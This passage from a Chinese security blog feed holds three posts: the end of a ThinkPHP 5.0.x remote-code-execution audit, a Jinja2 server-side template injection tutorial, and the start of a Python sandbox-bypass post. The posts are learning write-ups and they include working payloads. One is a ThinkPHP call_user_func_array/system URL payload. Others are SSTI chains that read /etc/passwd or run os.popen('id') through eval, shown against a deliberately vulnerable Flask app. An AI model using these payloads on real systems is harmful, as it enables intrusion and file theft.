$dispatch[<span class="string">'convert'</span>] : <span class="keyword">null</span></span><br><span class="line">                );</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            ...............</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $data;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>跟进<code>self::module</code>函数，在进入多模块部署后由于，bind的值为null，会进入elseif的条件，使available的变量成为true，这也是后面为什么可以顺利初始化module的条件，不然就会抛出异常XD。</p><p><img src="https://s2.ax1x.com/2019/02/15/kDbqeI.png" alt="kDbqeI.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">module</span><span class="params">($result, $config, $convert = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_string($result)) &#123;</span><br><span class="line">        $result = explode(<span class="string">'/'</span>, $result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $request = Request::instance();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($config[<span class="string">'app_multi_module'</span>]) &#123;</span><br><span class="line">        <span class="comment">// 多模块部署</span></span><br><span class="line">        $module    = strip_tags(strtolower($result[<span class="number">0</span>] ?: $config[<span class="string">'default_module'</span>]));</span><br><span class="line">        $bind      = Route::getBind(<span class="string">'module'</span>);</span><br><span class="line">        $available = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($bind) &#123;</span><br><span class="line">            <span class="comment">// 绑定模块</span></span><br><span class="line">            <span class="keyword">list</span>($bindModule) = explode(<span class="string">'/'</span>, $bind);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">empty</span>($result[<span class="number">0</span>])) &#123;</span><br><span class="line">                $module    = $bindModule;</span><br><span class="line">                $available = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> ($module == $bindModule) &#123;</span><br><span class="line">                $available = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (!in_array($module, $config[<span class="string">'deny_module_list'</span>]) &amp;&amp; is_dir(APP_PATH . $module)) &#123;</span><br><span class="line">            $available = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 模块初始化</span></span><br><span class="line">        <span class="keyword">if</span> ($module &amp;&amp; $available) &#123;</span><br><span class="line">            <span class="comment">// 初始化模块</span></span><br><span class="line">            $request-&gt;module($module);</span><br><span class="line">            $config = <span class="keyword">self</span>::init($module);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 模块请求缓存检查</span></span><br><span class="line">            $request-&gt;cache(</span><br><span class="line">                $config[<span class="string">'request_cache'</span>],</span><br><span class="line">                $config[<span class="string">'request_cache_expire'</span>],</span><br><span class="line">                $config[<span class="string">'request_cache_except'</span>]</span><br><span class="line">            );</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'module not exists:'</span> . $module);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 单一模块部署</span></span><br><span class="line">        $module = <span class="string">''</span>;</span><br><span class="line">        $request-&gt;module($module);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置默认过滤机制</span></span><br><span class="line">    $request-&gt;filter($config[<span class="string">'default_filter'</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当前模块路径</span></span><br><span class="line">    App::$modulePath = APP_PATH . ($module ? $module . DS : <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 是否自动转换控制器和操作名</span></span><br><span class="line">    $convert = is_bool($convert) ? $convert : $config[<span class="string">'url_convert'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取控制器名</span></span><br><span class="line">    $controller = strip_tags($result[<span class="number">1</span>] ?: $config[<span class="string">'default_controller'</span>]);</span><br><span class="line">    $controller = $convert ? strtolower($controller) : $controller;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取操作名</span></span><br><span class="line">    $actionName = strip_tags($result[<span class="number">2</span>] ?: $config[<span class="string">'default_action'</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($config[<span class="string">'action_convert'</span>])) &#123;</span><br><span class="line">        $actionName = Loader::parseName($actionName, <span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $actionName = $convert ? strtolower($actionName) : $actionName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置当前请求的控制器、操作</span></span><br><span class="line">    $request-&gt;controller(Loader::parseName($controller, <span class="number">1</span>))-&gt;action($actionName);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 监听module_init</span></span><br><span class="line">    Hook::listen(<span class="string">'module_init'</span>, $request);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $instance = Loader::controller(</span><br><span class="line">            $controller,</span><br><span class="line">            $config[<span class="string">'url_controller_layer'</span>],</span><br><span class="line">            $config[<span class="string">'controller_suffix'</span>],</span><br><span class="line">            $config[<span class="string">'empty_controller'</span>]</span><br><span class="line">        );</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException $e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'controller not exists:'</span> . $e-&gt;getClass());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取当前操作名</span></span><br><span class="line">    $action = $actionName . $config[<span class="string">'action_suffix'</span>];</span><br><span class="line"></span><br><span class="line">    $vars = [];</span><br><span class="line">    <span class="keyword">if</span> (is_callable([$instance, $action])) &#123;</span><br><span class="line">        <span class="comment">// 执行操作方法</span></span><br><span class="line">        $call = [$instance, $action];</span><br><span class="line">        <span class="comment">// 严格获取当前操作方法名</span></span><br><span class="line">        $reflect    = <span class="keyword">new</span> \ReflectionMethod($instance, $action);</span><br><span class="line">        $methodName = $reflect-&gt;getName();</span><br><span class="line">        $suffix     = $config[<span class="string">'action_suffix'</span>];</span><br><span class="line">        $actionName = $suffix ? substr($methodName, <span class="number">0</span>, -strlen($suffix)) : $methodName;</span><br><span class="line">        $request-&gt;action($actionName);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">elseif</span> (is_callable([$instance, <span class="string">'_empty'</span>])) &#123;</span><br><span class="line">        <span class="comment">// 空操作</span></span><br><span class="line">        $call = [$instance, <span class="string">'_empty'</span>];</span><br><span class="line">        $vars = [$actionName];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 操作不存在</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'method not exists:'</span> . get_class($instance) . <span class="string">'-&gt;'</span> . $action . <span class="string">'()'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Hook::listen(<span class="string">'action_begin'</span>, $call);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">self</span>::invokeMethod($call, $vars);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟进的就是我在文章一开头说的内容，controller变量就被赋值，然后获得方法名字，开始请求这个方法</p><p><img src="https://s2.ax1x.com/2019/02/15/kDqoNV.png" alt="kDqoNV.png"></p><p>最后还是返回了这个方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">self</span>::invokeMethod($call, $vars);</span><br></pre></td></tr></table></figure><p>$call变量是个数组，里面包含了控制器以及操作，可以追踪里面的变量变化</p><p><img src="https://s2.ax1x.com/2019/02/15/kDL3uj.png" alt="kDL3uj.png"></p><p>然后通过<code>ReflectionMethod</code>方法去构造一个映射，反正就把他当成平常一个类去调用某个方法，接着就把剩余的url的剩余内容赋值给args，最后调用<code>invokefunction</code>函数，这个函数也类似回调函数，所以就会把<code>&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=dir</code>传进<code>invokefunction</code>这个方法里面。</p><p><img src="https://s2.ax1x.com/2019/02/15/kDLOG8.png" alt="kDLOG8.png"></p><p><img src="https://s2.ax1x.com/2019/02/15/kDOPI0.png" alt="kDOPI0.png"></p><p>可以看到里面args里面的内容结构，里面包含了多个数组</p><p><img src="https://s2.ax1x.com/2019/02/15/kDO2es.png" alt="kDO2es.png"></p><p>继续跟进的话，你会发现这个函数跟上面跟进的函数的套路一模一样，也是利用了回调的效果，也是利用一个变量把system后面的内容返回给<code>call_user_func_array</code>，只不过这次可以直接调用<code>call_user_func_array</code>了，相当于<code>call_user_func_array(&quot;system&quot;,&quot;dir&quot;)</code>了</p><p><img src="https://s2.ax1x.com/2019/02/15/kDvUeJ.png" alt="kDvUeJ.png"></p><h3 id="补丁后的效果"><a href="#补丁后的效果" class="headerlink" title="补丁后的效果"></a>补丁后的效果</h3><p>再来观察一下加上补丁的走向，直接就会进入抛出异常的步骤，只要匹配到不是字母开头的控制器的话直接进入异常，有效避免利用命名空间构造攻击链</p><p><img src="https://s2.ax1x.com/2019/02/15/kDx8AA.png" alt="kDx8AA.png"></p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ol><li>这个攻击链的构造，还是概念模糊，如果真正构造的时候需要怎么去做？这里只是根据别人的payload去分析代码，分析它的攻击过程，个人感觉真正核心的东西没掌握，也有可能看得多就会了？？？XD因为这个东西不只是这个模块可以如此调用，还有其他模块也有同样的效果，这也比较考验对该框架的熟悉程度，多接触开发还是很好的。</li><li>看了好几篇文章，发现这几个都是差不多从路由的检测开始跟进，其实想想也对，毕竟payload从url中来，跟进某函数跟到底了再返回，有可能这是一种套路，先记下来。。。</li><li>我也是第一次审计这种东西，毕竟ThinkPHP 5.0.x 的代码执行漏洞，从漏洞技术含量和利用链构造上来看，算是2018年一个很牛的洞了，对我这种菜鸡，学习到就好。</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;第一次进行代码量这么大的分析，记录一下，个人感觉新手真的不适应这种，应该找点小一点的cms去分析，如果不懂MVC架构
    
    </summary>
    
      <category term="代码审计" scheme="0verwatch.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="0verwatch.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>SSTI-injection</title>
    <link href="0verwatch.top/SSTI-injection.html"/>
    <id>0verwatch.top/SSTI-injection.html</id>
    <published>2019-02-04T08:30:46.000Z</published>
    <updated>2019-02-08T10:11:56.488Z</updated>
    
    <content type="html"><![CDATA[<h3 id="先入个门"><a href="#先入个门" class="headerlink" title="先入个门"></a>先入个门</h3><h4 id="Jimja2"><a href="#Jimja2" class="headerlink" title="Jimja2"></a>Jimja2</h4><p><code>Jinja2</code>是默认的仿<code>Django</code>模板的一个模板引擎，由<code>Flask</code>的作者开发。网上搜的语法<a id="more"></a>2333，方便自己回顾</p><h5 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; ... &#125;&#125;：装载一个变量，模板渲染的时候，会使用传进来的同名参数这个变量代表的值替换掉。</span><br><span class="line">&#123;% ... %&#125;：装载一个控制语句。</span><br><span class="line">&#123;# ... #&#125;：装载一个注释，模板渲染的时候会忽视这中间的值</span><br></pre></td></tr></table></figure><h5 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h5><p>在模板中添加变量，可以使用（set）语句。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set name=&apos;xx&apos; %&#125;</span><br></pre></td></tr></table></figure><p><code>with</code>语句来创建一个内部的作用域，将<code>set</code>语句放在其中，这样创建的变量只在<code>with</code>代码块中才有效</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% with gg = 42 %&#125;</span><br><span class="line">&#123;&#123; gg &#125;&#125;</span><br><span class="line">&#123;% endwith %&#125;</span><br></pre></td></tr></table></figure><h5 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if ken.sick %&#125;</span><br><span class="line">Ken is sick.</span><br><span class="line">&#123;% elif ken.dead %&#125;</span><br><span class="line">You killed Ken! You bastard!!!</span><br><span class="line">&#123;% else %&#125;</span><br><span class="line">Kenny looks okay --- so far</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><h5 id="for语句"><a href="#for语句" class="headerlink" title="for语句"></a>for语句</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for user in users %&#125;</span><br><span class="line">&#123;&#123; user.username|e &#125;&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h5 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for key, value in &lt;strong&gt;my_dict.iteritems()&lt;/strong&gt; %&#125;</span><br><span class="line">&amp;lt;dt&amp;gt;&#123;&#123; key|e &#125;&#125;&amp;lt;/dt&amp;gt;</span><br><span class="line">&amp;lt;dd&amp;gt;&#123;&#123; value|e &#125;&#125;&amp;lt;/dd&amp;gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h5 id="Jinja2中for循环内置常量"><a href="#Jinja2中for循环内置常量" class="headerlink" title="Jinja2中for循环内置常量"></a>Jinja2中for循环内置常量</h5><p>loop.index    当前迭代的索引（从1开始）<br>loop.index0    当前迭代的索引（从0开始）<br>loop.first    是否是第一次迭代，返回True\/False<br>loop.last    是否是最后一次迭代，返回True\/False<br>loop.length    序列的长度<br> 注意：不可以使用continue和break表达式来控制循环的执行。</p><h5 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h5><p>过滤器是通过<code>（|）</code>符号进行使用的，例如：<code>0</code>：将返回name的长度</p><p>类似于我们平常的的函数，他他这种应该就是内置函数，因为它本身就含有很多过滤器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">abs(value)：返回一个数值的绝对值。示例：-1|abs</span><br><span class="line">last(value)：返回一个序列的最后一个元素。示例：names|last。</span><br><span class="line">length(value)：返回一个序列或者字典的长度。示例：names|length。</span><br><span class="line">join(value,d=u&apos;&apos;)：将一个序列用d这个参数的值拼接成字符串。</span><br><span class="line">int(value)：将值转换为int类型。</span><br><span class="line">float(value)：将值转换为float类型。</span><br><span class="line">lower(value)：将字符串转换为小写。</span><br><span class="line">upper(value)：将字符串转换为小写</span><br></pre></td></tr></table></figure><h3 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h3><p>简单地说跟这种类型的注入跟一般的注入成因其实一样，都是过分相信用户的输入导致的漏洞，这样一来通过模板注入可以导致敏感信息泄露、代码执行等诸多漏洞，这里有一篇关于PHP的模板注入，写的挺好，可以参考一下：<code>https://www.freebuf.com/vuls/83999.html</code>,但这篇文章PHP 模版引擎 Twig 作为例子，只是简单介绍了一下XSS的相关漏洞，并没有触发更大的危害，但是常规的测试方法已经写了出来，跟测试注入其实差不多，就是换了内容而已。</p><p><img src="https://s2.ax1x.com/2019/02/07/ktayNt.png" alt="ktayNt.png"></p><p>所以下面就自己搭个python的web环境，以危害更大的<code>SSTI模板</code>注入作为例子说明，这是app.py里面的代码内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    name = request.args.get(<span class="string">'name'</span>, <span class="string">'guest'</span>)</span><br><span class="line"></span><br><span class="line">    t = Template(<span class="string">"Hello "</span> + name)</span><br><span class="line">    <span class="keyword">return</span> t.render()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br></pre></td></tr></table></figure><p>可以看得出来name参数直接以get方式获取，直接拼接在Hello后面作为模板，直接render，这很明显name参数是可控的。问题也恰好是出在这。</p><p>当然这里也是有XSS的</p><p><img src="https://s2.ax1x.com/2019/02/07/ktJXGD.png" alt="ktJXGD.png"></p><p>但是重点还是放在读文件这一功能上，这也相当于直接RCE了，先要学习一下下面这几个类，<code>__mro__</code>以及<code>__subclasses__</code>属性，其实这里有点像python沙盒绕过的构造方法23333.</p><p><code>__mro__</code>中的MRO(Method Resolution Order)代表着解析方法调用的顺序，可以看看<a href="https://docs.python.org/release/2.6.4/library/stdtypes.html#class.__mro__" target="_blank" rel="noopener">Python文档</a>中的介绍。</p><p><code>__subclasses__</code>属性在这里作为一种方法被<a href="https://docs.python.org/release/2.6.4/library/stdtypes.html#class.__subclasses__" target="_blank" rel="noopener">定义</a>为，对每个new-style class“为它的直接子类维持一个弱引用列表”，之后“返回一个包含所有存活引用的列表”。</p><p>上面的这两个属性引用自这篇文章：<code>https://www.freebuf.com/articles/web/98928.html</code></p><p>个人直接理解就是<code>__mro__</code>会输出当前对象所调用的全部类包括其父类，而<code>__subclasses__</code>会输出该类下所有的子类。OK，这样就可以愉快的开始了</p><p>先来测试一下是否存在这个漏洞，输入参数<code>25hello</code>，明显存在漏洞</p><p><img src="https://s2.ax1x.com/2019/02/07/ktfbPU.png" alt="ktfbPU.png"></p><p>首先我们要做的第一件事便是选择一个new-style object用于访问<code>object</code>基类。可以简单的使用<code>&#39;&#39;</code>，一个空字符串，<code>str</code>对象类型。之后可以使用<code>__mro__</code>属性访问对象的继承类。将<code></code>作为payload注入到存在SSTI漏洞的页面中</p><p><img src="https://s2.ax1x.com/2019/02/07/ktYYQJ.png" alt="ktYYQJ.png"></p><p>出现两个类，选择第二个object基类，并显示该类下方的所有子类，注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;.__class__.__mro__[1].__subclasses__() &#125;&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/07/ktYReI.png" alt="ktYReI.png"></p><p>上面链接的文章里面使用file类去进行对文件的读写操作，payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/etc/passwd&apos;).read() &#125;&#125;</span><br></pre></td></tr></table></figure></p><p>但是file方法在py3中已经不支持，只要找到可以执行代码的函数或者其他读文件的函数都可以，在vulhub上找到的另外一个适合py3的，利用了eval函数去实现RCE的功能，因为执行语句去实现的，所以得用%括住。方法不止一种，找到对的继承链就可以。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &apos;catch_warnings&apos; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &apos;eval&apos; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&apos;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/07/ktNZbn.png" alt="ktNZbn.png"></p><p>成功读取根目录下的文件</p><p><img src="https://s2.ax1x.com/2019/02/07/ktNMCT.png" alt="ktNMCT.png"></p><p>另外再拿</p><p>这东西只要找对继承关系，而且继承关系里面的方法清楚的话就很快获得效果，当然防范的话得从代码层下手，永远不要相信用户的输入就对了，对可控变量做好防御XD</p><p>参考文章:</p><p><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf</a></p><p><a href="https://www.freebuf.com/vuls/83999.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/83999.html</a></p><p><a href="https://www.freebuf.com/articles/web/98928.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/98928.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;先入个门&quot;&gt;&lt;a href=&quot;#先入个门&quot; class=&quot;headerlink&quot; title=&quot;先入个门&quot;&gt;&lt;/a&gt;先入个门&lt;/h3&gt;&lt;h4 id=&quot;Jimja2&quot;&gt;&lt;a href=&quot;#Jimja2&quot; class=&quot;headerlink&quot; title=&quot;Jimja2&quot;&gt;&lt;/a&gt;Jimja2&lt;/h4&gt;&lt;p&gt;&lt;code&gt;Jinja2&lt;/code&gt;是默认的仿&lt;code&gt;Django&lt;/code&gt;模板的一个模板引擎，由&lt;code&gt;Flask&lt;/code&gt;的作者开发。网上搜的语法
    
    </summary>
    
      <category term="SSTI注入" scheme="0verwatch.top/categories/SSTI%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SSTI注入" scheme="0verwatch.top/tags/SSTI%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Python沙盒绕过</title>
    <link href="0verwatch.top/python-sandbox-bypass.html"/>
    <id>0verwatch.top/python-sandbox-bypass.html</id>
    <published>2019-02-04T08:28:00.000Z</published>
    <updated>2019-02-08T10:20:31.385Z</updated>
    
    <content type="html"><![CDATA[<h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><p>一些函数需要了解一下，这篇文章讲的已经很详细<a id="more"></a>了:<a href="https://xz.aliyun.com/t/2308#toc-12，概括一下分别是下面的函数" target="_blank" rel="noopener">https://xz.aliyun.com/t/2308#toc-12，概括一下分别是下面的函数</a></p><ul><li><code>__class__</code> :返回一个实例所属的类</li><li><code>__bases__</code> :返回一个类<code>直接</code>所继承的类（元组形式）</li><li><code>__mro__</code> :列出解析方法的调用顺序，类似于bases</li><li><code>__subclasses__()</code>：返回子类列表</li><li><code>__dict__</code> ： 列出当前属性/函数的字典</li><li><code>func_globals</code>：返回一个包含函数全局变量的字典引用</li><li><code>__globals__</code>:返回一个当前空间下能使用的模块，方法和变量的字典</li></ul><p>上面的模块中可以尝试理解mro和bases之间的区别，两个的东西还是有点区别的，只是作用在绕过上功能类似。个人感觉mro的发展过程有点像从dfs编程bfs。。。</p><h3 id="dir方法"><a href="#dir方法" class="headerlink" title="dir方法"></a>dir方法</h3><ul><li>dir()在没有参数的时候返回本地作用域中的名称列表</li><li>dir()在有参数的时候返回该对象的有效属性列表</li></ul><p>对比一下下面的例子就知道了，以py2为例：</p><p><img src="https://s2.ax1x.com/2019/02/07/ktIJLd.png" alt="ktIJLd.png"></p><h3 id="内联模块"><a href="#内联模块" class="headerlink" title="内联模块"></a>内联模块</h3><p>python中可以直接运行一些函数，例如<code>int(),list()</code>等等。这些函数可以在内联模块中可以查到。</p><p>常用的有下面两个：<code>__import__</code>以及<code>__builtins__</code>，但是在py2里面内置模块名字叫<code>__builtin__</code>，py3改名叫<code>__builtins__</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python 2.7</span></span><br><span class="line">In [<span class="number">4</span>]: __builtin__</span><br><span class="line">Out[<span class="number">4</span>]: &lt;module <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: __builtins__</span><br><span class="line">Out[<span class="number">5</span>]: &lt;module <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"><span class="comment">#python 3.6</span></span><br><span class="line">In [<span class="number">2</span>]: __builtin__                                                                                             </span><br><span class="line">Out[<span class="number">2</span>]: &lt;module <span class="string">'builtins'</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: __builtins__                                                                                    </span><br><span class="line">Out[<span class="number">3</span>]: &lt;module <span class="string">'builtins'</span> (built-<span 